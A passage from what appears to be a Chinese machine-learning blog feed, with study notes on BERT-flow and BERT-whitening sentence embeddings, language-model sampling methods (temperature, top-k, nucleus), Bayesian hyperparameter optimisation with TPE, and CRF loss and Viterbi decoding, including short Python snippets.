style="zoom:40%;"></p><p>这是一种直接在objectfunction基础之上优化计算的方法，粗暴但是实现起来并不简单。直接从<span class="math inline">\(\pi(z)\)</span>，由设计的网络<span class="math inline">\(x=f(z)\)</span>，直接逼近data分布<span class="math inline">\(p(x)\)</span>。原理如下：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210116231825051.png" srcset="/img/loading.gif" lazyload alt style="zoom:28%;"></p><p>相应变量的微小变化，导致的面积变化是一致的。扩展到二维变量，其变化相乘变成了面积的<span class="math inline">\(\Deltas\)</span>。而矩阵的行列式就表示二维空间中图像代表的面积，所以有以下推导：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210116232216359.png" srcset="/img/loading.gif" lazyload alt style="zoom:25%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210116232538391.png" srcset="/img/loading.gif" lazyload alt style="zoom:25%;"></p><p>式中矩阵就是Jacobian matrix，自然得到： <span class="math inline">\(p(x&#39;)=\pi(z&#39;)|\frac{1}{det(J_f)}|\)</span>那么由<span class="math inline">\(z\)</span>的分布就可以求出<span class="math inline">\(x\)</span>的分布。只是这个网络<span class="math inline">\(G\)</span>的设计有一点麻烦，需要保证参数矩阵需要是逆变换不复杂且Jacobianmatrix容易计算。因为： <span class="math inline">\(p(x&#39;)=\pi(z&#39;)|det(J_{G^{-1}})|\)</span>以及 <span class="math inline">\(z&#39;=G^{-1}(x&#39;)\)</span></p><p>都需要转化成与输入相关的函数（网络）。</p><p>同时flow的网络设计，真的是有点低效，参数空间内将参数分组进行更新。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210116234831917.png" srcset="/img/loading.gif" lazyload alt style="zoom:25%;"></p><p>如图，上下两部分不是同时更新，而是分步更新计算。</p><h3><span id="key-sentences">Key sentences:</span></h3><ol type="1"><li>用BERT将一个句子编码成一个固定长度的向量，方法是计算BERT最后几层中contextembeddings的平均值，或者在[CLS]标记的位置提取。一般前一种方法效果更好。但是在语义表示性能上还不及averagedGloVe embeddings方法。</li></ol><h3><span id="1语义相似度与bert预训练的关系">1.语义相似度与BERT预训练的关系</span></h3><p>​ 首先，BERT将传统的auto regressive LM的目标，修改为masked predict：<span class="math display">\[log(p(x_{1:T}))=\sum_{t=1}^{T}logp(x_t|context_t)\]</span> 变为： <span class="math display">\[p(x_{masked}|context_{of\ masked})=\sum_{t=1}^{T}mask_t \timesp(x_t|context_t)\]</span> 两者建立model的共同形式如下： <span class="math display">\[p(x|context)=\frac{\exp(VectorFromNet_{context}^TEmbedding_x)}{\sum_{x&#39;}\exp(VectorFromNet_{context}^TEmbedding_{x&#39;})}\]</span> 这种表达形式的关键在<span class="math inline">\(VectorFromNet_{context}^TEmbedding_x\)</span>，以下简单写作<span class="math inline">\(h_c^Tw_x\)</span>。<a href="https://arxiv.org/abs/1711.03953">这篇论文</a>证明了： <span class="math display">\[h_c^Tw_x\approx\log p^*(x|c) + \lambda_c=PMI(x,c)+\log p(x)+\lambda_c\]</span> ​ PMI指point wise mutualinformation。这种共现特征通常可以捕捉到语义信息，只是在“word”层面而言。</p><p>​ 同时，<span class="math inline">\(h_c\)</span>随着网路参数的更新而更新，不同的context在训练过程中相互影响，可视为一种高阶的high-order共现语义信息捕捉。</p><h3><span id="2-问题所在">2. 问题所在</span></h3><blockquote><p>用BERT将一个句子编码成一个固定长度的向量，方法是计算BERT最后几层中contextembeddings的平均值，或者在[CLS]标记的位置提取。一般前一种方法效果更好。但是在语义表示性能上还不及averagedGloVe embeddings方法。</p></blockquote><p>为什么效果不及averaged GloVe embeddings？</p><p>文章 <a href="https://arxiv.org/abs/1909.00512" target="_blank" rel="noopener">How Contextual areContextualized Word Representations? Comparing the Geometry of BERT,ELMo, and GPT-2 Embeddings</a> 比较了预训练LM的wordembedding，有如下结论：</p><blockquote><ol type="1"><li>Contextualizedrepresentations(模型每一层输出)在每一个非输入层都是各向异性的，即非标准正交空间；</li><li>高层的各向异性更显著；</li><li>高层的Contextualizedrepresentations更与context相关，不同context下的数值表示相差更大。同时不同词与context相关的相关程度不同，比如，stopwords与context的相关性会很大；</li><li>不同模型的每一层输出间的相关性也不同：EMLo的低层和高层的输出更相似一些；BERT的低层和高层的输出变化较大，<strong>同时句子内词的表示会更接近，和其他句子中词的表示相对更差异化一些</strong>；GPT-2的输出不同，某一个输出与当前句子内的词的相似性和当前句子之外的词的相似性，是接近的。</li></ol></blockquote><p>BERT-flow文中给出的理由：</p><ol type="1"><li>词频差异使得低频词和高频词的学习程度不同，公式7可以作为一个依据；</li><li>低频词的表示更偏稀疏，而高频词的表示更稠密。</li></ol><h3><span id="3-可逆变换到standardgaussian-latent-space">3. 可逆变换到standardGaussian latent space</span></h3><p>借鉴Glow模型的实现方式，实现flow-based generativemodel。将BERT参数固定，只学习可逆变换的网络参数。只使用了add couplinglayer，将1x1卷积变成直接permutation。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210120014758397.png" srcset="/img/loading.gif" lazyload alt style="zoom:30%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210120014921100.png" srcset="/img/loading.gif" lazyload alt style="zoom:33%;"></p><p>求z为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210120015103566.png" srcset="/img/loading.gif" lazyload alt style="zoom:33%;"></p><p>以上将D维向量，分为两部分计算更新。同时z的先验为标准正态分布。那么</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210120015440557.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p><span class="math inline">\(f^{-1}\)</span>和<span class="math inline">\(J_{f^{-1}}\)</span>都是可以计算的，目标函数就可以表示。</p><h3><span id="4-lexicalsimilarity在不同模型中的规律实验">4. LexicalSimilarity在不同模型中的规律实验</span></h3><p>论文通过一组简单的对比实验，得出以下结论：</p><blockquote><p>BERT-Induced Similarity的与Lexical Similarity存在着过度的相关性。</p><p>Flow-Induced Similarity 与Lexical Similarity的相关性较低。</p></blockquote><p>方法是通过Similarity与Edit distance的对应关系，实验结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/BERT-flow and more_pic/image-20210212231503716.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><hr><h2><span id="confusion">Confusion:</span></h2><h3><span id="正交标准化标准化协方差矩阵">正交标准化？标准化协方差矩阵？</span></h3><p>求一个线性变换<span class="math inline">\(W\)</span>使得BERT输出的向量矩阵成一个标准化的矩阵。直接达到正交化的目的，是否也是可行？</p><p>首先求原始协方差矩阵： <span class="math display">\[\mu=\frac{1}{N}\sum_{k=1}^Nxi\]</span> 那么 <span class="math display">\[\Sigma=\frac{1}{N}\sum_{k=1}^N(x_i-\mu)^T(x_i-\mu)\]</span> 变换<span class="math inline">\(W\)</span>满足： <span class="math display">\[W^T\Sigma W=I\]</span> 其中<span class="math inline">\(\Sigma\)</span>为一个正交对称矩阵。对其SVD，有如下关系：<span class="math display">\[\Sigma=U\Lambda U^T=(W^{-1})^TW^{-1}\]</span> 得到变换<span class="math inline">\(W\)</span>为： <span class="math display">\[W=U\sqrt{\Lambda^{-1}}\]</span> <a href="https://spaces.ac.cn/archives/8069">作者</a>实验的结果显示，该方法简洁，且效果与flow模型相差无几。</p><p>作者称该方法为BERT-whitening。</p><p>核心代码：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compute_w_bias</span><span class="hljs-params">(vecs, n_components)</span>:</span><br>    vecs = np.concatenate(vecs, axis=<span class="hljs-number">0</span>)<br>    mu = vecs.mean(axis=<span class="hljs-number">0</span>, keepdims=<span class="hljs-literal">True</span>)<br>    cov = np.cov(vecs.T)<br>    u, s, vh = np.linalg.svd(cov)<br>    W = np.np.dot(u, np.diag(<span class="hljs-number">1</span>/np.sqrt(s)))<br>    <span class="hljs-keyword">return</span> W[:, :n_components], -mu<br></code></pre></div></td></tr></table></figure><p>标准化</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform_and_normalize</span><span class="hljs-params">(vecs, kernel=None, bias=None)</span>:</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (kernel <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> bias <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):<br>        vecs = (vecs + bias).dot(kernel)<br>    <span class="hljs-keyword">return</span> vecs / (vecs**<span class="hljs-number">2</span>).sum(axis=<span class="hljs-number">1</span>, keepdims=<span class="hljs-literal">True</span>)**<span class="hljs-number">0.5</span><br></code></pre></div></td></tr></table></figure><h3><span id="实现细节">实现细节</span></h3><ol type="1"><li>大语料计算内存问题？</li></ol><p>句子向量均值递归计算 <span class="math display">\[\mu_{n+1}=\frac{n}{n+1}\mu_n+\frac{1}{n+1}x_{n+1}\]</span> 协方差递归计算 <span class="math display">\[\Sigma_{n+1}=\frac{n}{n+1}\Sigma_n+\frac{1}{n+1}(x_{n+1}-\mu)^T(x_{n+1}-\mu)\]</span></p><ol start="2" type="1"><li>BERT模型在任务数据上，先微调</li></ol><p>论文中先在任务数据上微调，比如先进行情感分类任务，再用来计算句子向量。</p><ol start="3" type="1"><li>flow做不到的简单的句子向量降维</li></ol><p>SVD中直接取<span class="math inline">\(W\)</span>前n个维度，即PCA，得到降维的结果。该结果将更具任务语境特征的维度提取出来。不仅提升了句子向量间相似度的速度，还可能提升预测的效果。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sentence embedding </tag>
            
            <tag> BERT </tag>
            
            <tag> nlp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言模型Sampling方法</title>
      <link href="/posts/e798f591.html"/>
      <url>/posts/e798f591.html</url>
      
        <content type="html"><![CDATA[<p>在textgeneration模型预测时，如果我们总是抽取最有可能的单词，标准语言模型训练目标会容易陷入“Idon’t know. I don’t know. I don’t know.” 这种循环中。所以有了samplebased generation方法。但是，它有一个潜在问题：</p><blockquote><p>假如依照logitsoftmax生成的分布进行sample，假设有60%的词的概率极低以至于基本不会被选择，但是这60%的词的总的CDF占了30%，这意味着模型预测方向可能有30%的概率偏离了“正确”的方向。</p><p>而如果是在预测前期发生偏离，那么由于错误向后预测的累积，直接导致了预测的效果变差。</p></blockquote><p>已有论文研究发现，经常被使用的Beamsearch方法，其生成效果和人类的表达有着一定的gap。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/语言模型--Sample_pic/image-20210102130824216.png" srcset="/img/loading.gif" lazyload alt="image-20210102130824216" style="zoom:40%;"></p><p>[^]: Humans often choose words that surprise language models(Holtzman et al 2019) https://arxiv.org/abs/1904.09751</p><p>解决方法：temperature sampling和top k sampling.</p><h3><span id="temperaturesampling"><strong>Temperature</strong><strong>sampling</strong></span></h3><blockquote><p>借鉴热力学中现象，温度越高，则低energy的状态出现的概率会增加。</p></blockquote><p>以logits作为“energy”，在进行softmax之前，除以temperature。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = torch.tensor([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4.</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>F.softmax(a, dim=<span class="hljs-number">0</span>)<br>tensor([<span class="hljs-number">0.0321</span>, <span class="hljs-number">0.0871</span>, <span class="hljs-number">0.2369</span>, <span class="hljs-number">0.6439</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>F.softmax(a/<span class="hljs-number">.5</span>, dim=<span class="hljs-number">0</span>)<br>tensor([<span class="hljs-number">0.0021</span>, <span class="hljs-number">0.0158</span>, <span class="hljs-number">0.1171</span>, <span class="hljs-number">0.8650</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>F.softmax(a/<span class="hljs-number">1.5</span>, dim=<span class="hljs-number">0</span>)<br>tensor([<span class="hljs-number">0.0708</span>, <span class="hljs-number">0.1378</span>, <span class="hljs-number">0.2685</span>, <span class="hljs-number">0.5229</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>F.softmax(a/<span class="hljs-number">1e-6</span>, dim=<span class="hljs-number">0</span>)<br>tensor([<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">1.</span>])<br></code></pre></div></td></tr></table></figure><p>NOTE：<strong>temperature越大，分布越趋向均匀</strong></p><h3><span id="top-ksampling"><strong>Top k</strong><strong>sampling</strong></span></h3><p>Top k sampling是指根据概率进行排序将第k个token以下的概率都归零。</p><p>但是存在一个问题：某些时候，分布较均匀，可以选择的token大于k；某些时候，分布较集中，可以选择的token小于k。</p><p>直接导致了预测错误的概率增大。</p><h3><span id="top-psamplingnucleus-sampling"><strong>Top p</strong><strong>sampling</strong>（<strong>nucleus sampling</strong>）</span></h3><p>1，按概率sort预测分布；</p><p>2，计算CDF；</p><p>3，将CDF大于某个设定p值之后的logit值，设为一个很大的负值；</p><p>4，softmax，之后进行采样。</p><p>这样就能动态的改变可选择的token数量，且错误概率相对降低。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">top_k_top_p_filtering</span><span class="hljs-params">(logits, top_k=<span class="hljs-number">0</span>, top_p=<span class="hljs-number">0.0</span>, filter_value=-float<span class="hljs-params">(<span class="hljs-string">'Inf'</span>)</span>)</span>:</span><br>    <span class="hljs-string">""" Filter a distribution of logits using top-k and/or nucleus (top-p) filtering</span><br><span class="hljs-string">        Args:</span><br><span class="hljs-string">            logits: logits distribution shape (..., vocabulary size)</span><br><span class="hljs-string">            top_k &gt;0: keep only top k tokens with highest probability (top-k filtering).</span><br><span class="hljs-string">            top_p &gt;0.0: keep the top tokens with cumulative probability &gt;= top_p (nucleus filtering).</span><br><span class="hljs-string">    """</span><br>    top_k = min(top_k, logits.size(<span class="hljs-number">-1</span>))  <span class="hljs-comment"># Safety check</span><br>    <span class="hljs-keyword">if</span> top_k &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># Remove all tokens with a probability less than the last token of the top-k</span><br>        indices_to_remove = logits &lt; torch.topk(logits, top_k)[<span class="hljs-number">0</span>][..., <span class="hljs-number">-1</span>, <span class="hljs-literal">None</span>]<br>        logits[indices_to_remove] = filter_value<br><br>    <span class="hljs-keyword">if</span> top_p &gt; <span class="hljs-number">0.0</span>:<br>        sorted_logits, sorted_indices = torch.sort(logits, descending=<span class="hljs-literal">True</span>)<br>        cumulative_probs = torch.cumsum(F.softmax(sorted_logits, dim=<span class="hljs-number">-1</span>), dim=<span class="hljs-number">-1</span>)<br><br>        <span class="hljs-comment"># Remove tokens with cumulative probability above the threshold</span><br>        sorted_indices_to_remove = cumulative_probs &gt;= top_p<br>        <span class="hljs-comment"># Shift the indices to the right to keep also the first token above the threshold</span><br>        sorted_indices_to_remove[..., <span class="hljs-number">1</span>:] = sorted_indices_to_remove[..., :<span class="hljs-number">-1</span>].clone()<br>        sorted_indices_to_remove[..., <span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br><br>        indices_to_remove = torch.zeros_like(logits, dtype=torch.uint8).scatter_(<br>            dim=<span class="hljs-number">-1</span>, index=sorted_indices, src=sorted_indices_to_remove )<br>        logits[indices_to_remove] = filter_value<br>    <span class="hljs-keyword">return</span> logits<br></code></pre></div></td></tr></table></figure><h3><span id="end">End</span></h3><p>虽然有这些方法来改进模型生成的效果，但是这些仅仅是模型的“补丁”。如何提高模型本身的性能，如何让模型能够直接生成多样性的、更“人类”的语句？emmm...</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> language model </tag>
            
            <tag> sampling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贝叶斯超参数搜索</title>
      <link href="/posts/d941eeb.html"/>
      <url>/posts/d941eeb.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201125225639541.png" srcset="/img/loading.gif" lazyload></p><p><a href="http://proceedings.mlr.press/v28/bergstra13.pdf" target="_blank" rel="noopener">paper byBergstra et al</a></p><p>一句话概括Bayesian hyperparameter optimization：</p><blockquote><p>build a probability model of the objective function and use it toselect the most promising hyperparameters to evaluate in the trueobjective function.</p></blockquote><p>常用算法：Sequential Model-Based Optimization (SMBO) with the TreeParzen Estimator (TPE)</p><h3><span id="原理简述">原理简述</span></h3><p>贝叶斯方法相较于随机搜索和网格搜索，是更高效的。随机搜索和网格搜索根本不关注过去的结果，而是继续在整个范围内搜索，即使最优答案(可能)很明显在一个小区域内。</p><p>与随机或网格搜索相反，贝叶斯方法跟踪过去的评估结果，建立形成一个概率模型，将超参数映射到目标函数上得分的概率。这个模型被称为目标函数的代理。代理模型（也叫做响应面）又相对更容易优化。</p><p>运行过程为：</p><blockquote><ol type="1"><li><p>建立目标函数的替代概率模型，代理模型</p></li><li><p>查找在代理上性能最佳的超参数</p></li><li><p>将这些超参数应用于真正的目标函数</p></li><li><p>更新包含新结果的代理模型</p></li><li><p>重复步骤2-4，直到达到最大迭代次数或时间为止</p></li></ol></blockquote><p>贝叶斯推理的目的是通过在每次评估目标函数后不断地更新概率模型，从而获得更多的数据，减少错误。</p><p>贝叶斯优化方法是有效的，因为它们有根据的选择了下一个超参数。基本思想是：<strong>花更多的时间选择下一个超参数，以减少对目标函数的调用</strong>。实际上，与在目标函数中花费的时间相比，选择下一个超参数所花费的时间是很少的。通过评估从过去的结果看似更有希望的超参数，贝叶斯方法可以在更少的迭代中找到比随机搜索更好的模型设置。</p><p>一个简单的解释如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201125233533906.png" srcset="/img/loading.gif" lazyload alt="image-20201125233533906" style="zoom:50%;"></p><p>代理模型是粗黑线和器上线界细黑线组成的区域。红色虚线表示真实的目标函数。</p><p>经过贝叶斯优化几轮迭代之后，得到：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201125233807512.png" srcset="/img/loading.gif" lazyload alt="image-20201125233807512" style="zoom:50%;"></p><p>代理模型逐渐趋近目标函数。</p><h3><span id="sequential-model-basedoptimization">Sequential Model-BasedOptimization</span></h3><p>Sequential是指一个接一个地进行试验，每次都通过应用贝叶斯推理更新概率模型(代理)来获取更好的超参数。组成部分有：</p><ol type="1"><li><p>要搜索的超参数域</p></li><li><p>以超参数为输入并输出得分的目标函数</p></li><li><p>目标函数的代理模型</p></li><li><p>一个<strong>criteria</strong>（<strong>SelectionFunction</strong>），称为选择函数，用于评估从替代模型中下一步要选择的超参数</p></li><li><p>该算法由（得分，超参数）对组成的历史记录，该历史对由算法用于更新代理模型</p></li></ol><p>代理模型的选择有：<a href="https://en.wikipedia.org/wiki/Gaussian_process">GaussianProcesses</a>, <a href="http://aad.informatik.uni-freiburg.de/papers/13-GECCO-BBOB_SMAC.pdf">RandomForest Regressions</a>, , Tree Parzen Estimators (TPE).</p><p><strong>criteria</strong>常用Expected Improvement</p><p>代理模型，也称为响应面，是利用以前的评估结果建立的目标函数的概率表示。</p><h4><span id="expected-improvement选择函数">Expected Improvement选择函数</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201126000440781.png" srcset="/img/loading.gif" lazyload alt="image-20201126000440781" style="zoom:50%;"></p><p>y* -- 目标函数的阈值</p><p>x -- 超参数组合的集合</p><p>y -- 输入x超参数得到的目标函数真实返回值</p><p>p(y | x) -- 代理模型输出的概率</p><p>其目的是最大化关于x的Expected Improvement。</p><p>如果p (y | x)在y &lt; y*处，都为零，则超参数x不会产生任何改进。</p><p>如果积分为正，则意味着超参数x预期会产生比阈值更好的结果。</p><h4><span id="tree-structuredparzen-estimator-tpe"><strong>Tree-structuredParzen Estimator (TPE)</strong></span></h4><p>使用贝叶斯公式，计算p(y | x)</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201126163323158.png" srcset="/img/loading.gif" lazyload alt="image-20201126163323158" style="zoom:50%;"></p><p>p (x | y)，是给定目标函数得分的超参数的概率。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201126163445388.png" srcset="/img/loading.gif" lazyload alt="image-20201126163445388" style="zoom:50%;"></p><p>对超参数做了两种不同的分布:一种是目标函数的值小于阈值，l(x)，另一种是目标函数的值大于阈值，g(x)。</p><p>结合SMBO以及一点直观的印象，我们希望从l(x)而不是从g(x)中得出x的值，因为这种分布只基于产生低于阈值得分的x的值。</p><p>最终得到的Expected Improvement：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/贝叶斯超参数搜索_pic/image-20201126163919181.png" srcset="/img/loading.gif" lazyload alt="image-20201126163919181" style="zoom:50%;"></p><p>可以发现Expected Improvement和<em>l(x) /g(x)</em>的比值成反比。提高EI，正是需要从l(x)中多得到p (x | y)的值。</p><p>该算法利用历史得分建立l(x)和g(x)，提出目标函数的概率模型，代理模型随着每次迭代而改进。</p><h3><span id="工具">工具</span></h3><p><a href="https://github.com/JasperSnoek/spearmint" target="_blank" rel="noopener">Spearmint</a>， <a href="https://github.com/Yelp/MOE">MOE</a> ： Gaussian Process(surrogate)</p><p><a href="https://github.com/hyperopt/hyperopt" target="_blank" rel="noopener">Hyperopt</a>：Tree-structured Parzen Estimator <a href="https://github.com/RacleRay/DeepLearningFoundation/blob/master/%E8%B6%85%E5%8F%82%E6%95%B0%E6%90%9C%E7%B4%A2.ipynb">Notebook示例</a>，<a href="https://github.com/jaberg/hyperopt/wiki/FMin">示例</a>，<a href="https://www.programcreek.com/python/example/98788/hyperopt.Trials">示例</a></p><p><a href="https://github.com/automl/SMAC3" target="_blank" rel="noopener">SMAC</a> ：Random Forestregression.</p><p>都使用Expected Improvement选择函数。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRF--SimpleNote</title>
      <link href="/posts/798499bc.html"/>
      <url>/posts/798499bc.html</url>
      
        <content type="html"><![CDATA[<h2><span id="motivation">Motivation</span></h2><p>NER标注输出不仅仅是简单的分类，而是具有一定关联规律的标注输出。CRF正是输出这种结构化结果的一种算法。</p><p>结合HMM（状态转移和状态释放）和最大熵模型（log linearmodel建模特征函数，寻找最优的条件概率），在MEMM的基础上，建立隐变量X的概率无向图解决了MEMM的局部归一化问题。</p><h2><span id="crf-loss-in-deep-learning">CRF loss in Deep Learning</span></h2><p>loss的优化目标是使得模型输出的最优路径和groudtruth路径尽量接近。即，最大化最优路径概率。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118151443920.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>最优路径概率定义为，</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118152037905.png" srcset="/img/loading.gif" lazyload></p><p>在CRF loss中，Pi通过两组变量求得，Emission Score和TransitionScore（传统CRF中的特征函数）。</p><blockquote><p>Emission Score：对应神经网络输出的hiddenstate。可视为每一步输出标签的分类概率分布预测，每一步输出维度为[#tags,1]。</p><p>Transition Score：对应CRF层中定义的状态转移权重矩阵。保存在CRFlayer中，[#tags, #tags]</p></blockquote><p>两者在深度模型中都是作为权重变量来优化学习的。</p><p>深度模型中的优化目标实际实现为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118153139040.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>分子计算可以简单计算发现，就是当前路径的Emission Score和TransitionScore沿路径之和。计算难点在于分母，可以通过递归实现其多分支结构计算。</p><p>递归过程：</p><blockquote><p>维护两个记录列表：<strong>obs和previous</strong>。<strong>previous</strong>存储了之前步骤的结果，<strong>obs</strong>代表当前状态可能的输出选择。</p><p>以step 0到step 1为例：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118155354383.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>扩展到#tags维度，沿着1轴，和transition matrix同维度</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118155435068.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118155940735.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118160009190.png" srcset="/img/loading.gif" lazyload></p><p>对score的每一列取指数，求和，在取对数，得到新的previous</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118160226783.png" srcset="/img/loading.gif" lazyload></p><p>递归计算，直到达到最后一个时间步。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118160412587.png" srcset="/img/loading.gif" lazyload></p><p>求得分母</p></blockquote><h3><span id="最佳路径导出viterbi">最佳路径导出Viterbi</span></h3><p>动态规划算法，过程类似loss中求分母的部分，但是状态转移方程（动态规划）不同。</p><blockquote><p>同样以step 0到step 1为例：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118155354383.png" srcset="/img/loading.gif" lazyload></p><p>扩展到#tags维度，沿着1轴，和transition matrix同维度</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118155435068.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118155940735.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118160009190.png" srcset="/img/loading.gif" lazyload></p><p>previous保存的累计最优得分状态变化为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118161201957.png" srcset="/img/loading.gif" lazyload></p><p>然后保存这一轮状态转移中，不同step0状态下对应的最优得分，以及最优得分对应的step1最优状态。即，保存两个列表，在下一次转移时，将最优得分和对应的最优状态append到结果中。</p></blockquote><p>根据最后一步的最优得分，回溯重构出最优路径。</p><h2><span 